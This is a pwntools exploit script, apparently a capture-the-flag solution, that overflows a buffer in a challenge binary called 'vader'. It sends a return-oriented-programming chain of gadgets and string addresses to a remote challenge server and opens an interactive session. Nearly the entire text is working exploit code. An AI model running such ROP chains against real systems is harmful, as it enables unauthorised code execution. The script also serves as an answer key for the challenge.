from pwn import *

local = 0
if local == 1:
	target = process('./vader')
    #This breaks toward the end of main. Run it locally and watch the pops and register values to get a feel for how this works.
	pid = gdb.attach(target, "\nb *0x004015f8\n set disassembly-flavor intel\ncontinue")
else:
	target = remote('0.cloud.chals.io', 20712)

elf = ELF('vader')

#Gadgets:
pop_rdi = 0x000000000040165b	
pop_rsi_r15 = 0x0000000000401659
pop_rcx_rdx = 0x00000000004011cd
pop_r8 = 0x00000000004011d9

#Strings:
DARK = 0x00402ec9
S1D3 = 0x00402ece
OF = 0x00402ed3
TH3 = 0x00402ed6
FORC3 = 0x00402eda

print(target.recvuntil(b'Now I am the master >>>'))
#I used cyclic to figure out the padding size, I did not consider the explanation super important for the write-up.
payload = cyclic(200)
padding = b'a' * 40
payload = padding
payload += p64(pop_rdi)
payload += p64(DARK)
payload += p64(pop_rsi_r15)
#I just put two copies of the S1D3 address on the stack so that the second one is popped into r15.
payload += p64(S1D3) * 2
payload += p64(pop_rcx_rdx)
#The first address goes into rcx, and the second goes into rdx.
payload += p64(TH3) + p64(OF)
payload += p64(pop_r8)
payload += p64(FORC3)
#This is just an easy way to get the addresses of named functions in pwntools.
payload += p64(elf.symbols['vader'])

target.sendline(payload)


target.interactive()